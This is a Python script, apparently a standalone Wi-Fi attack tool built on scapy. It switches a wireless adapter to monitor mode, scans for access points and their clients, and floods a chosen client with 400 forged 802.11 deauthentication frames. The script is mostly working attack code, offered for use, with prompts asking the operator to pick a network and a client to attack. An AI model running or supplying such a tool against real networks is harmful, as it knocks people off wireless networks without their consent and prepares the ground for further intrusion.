from scapy.all import *
import string
import threading
import os, time
import random

network_adapter =raw_input("Please enter your network card name (iwconfig)")

ap_list = []
client_list = []
target_mac = ""
packets = 400
channel = 0
stop_hopper = False

def scan(pkt):
    if pkt.haslayer(Dot11):
        if (pkt.type == 0 and pkt.subtype == 8):
            if [pkt.addr2,pkt.info, int(ord(pkt[Dot11Elt:3].info))] not in ap_list:
                ap_list.append([pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info))])
                print("AP: %s SSID: %s Channel: %d" % (pkt.addr2, pkt.info, int(ord(pkt[Dot11Elt:3].info))))


def showAPs():
    sniff(iface=network_adapter, prn=scan,timeout=30)
    num = len(ap_list)
    for x in range(num):
       print(x, ap_list[x][1],ap_list[x][0])

    rescan = raw_input("----- Do you want to rescan ? y/n -----")
    if(rescan=="y"):
       showAPs()
    result = input("Choose number to attack")
    stop_hopper=True
    setChannel(int(ap_list[result][2]))
    scanClients(ap_list[result][0])


def scanClients(rmac):
    global target_mac
    target_mac = rmac
    sniff(iface=network_adapter,prn=onlyClients, timeout=30)
    attack()



def onlyClients(pkt):
   global client_list
   if ((pkt.addr2==target_mac or pkt.addr3 == target_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff"):
      if pkt.addr1 not in client_list:
        if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
            client_list.append(pkt.addr1)


def attack():
  if(len(client_list) == 0):
      print("No clients found, searching again...")
      scanClients(target_mac)

  for x in range(len(client_list)):
       print(x, client_list[x])
  rescan = raw_input("----- Do you want to rescan? y/n -----")
  if(rescan =="y"):
       scanClients(target_mac)
  choice = input("----- Choose client to attack -----")

  for y in range(packets):  
       pkt = RadioTap()/Dot11(addr1=client_list[choice], addr2=target_mac, addr3=target_mac)/Dot11Deauth()
       sendp(pkt, iface=network_adapter)


def goMonitor() :
    os.system('sudo ifconfig %s down' % network_adapter)
    os.system('sudo iwconfig %s mode monitor' % network_adapter)
    os.system('sudo ifconfig %s up' % network_adapter)

def setChannel(channel): 
      os.system('iwconfig %s channel %d' % (network_adapter, channel))

def hopper(iface):
    n = 1
    while not stop_hopper:
        time.sleep(0.50)
        os.system('iwconfig %s channel %d' % (iface, n))
        dig = int(random.random() * 14)
        if dig != 0 and dig != n:
            n = dig

if __name__ == "__main__":
    thread = threading.Thread(target=hopper, args=(network_adapter, ), name="hopper")
    thread.daemon = True
    thread.start()
    goMonitor()
    print("Searching for APs...")

    showAPs()

    

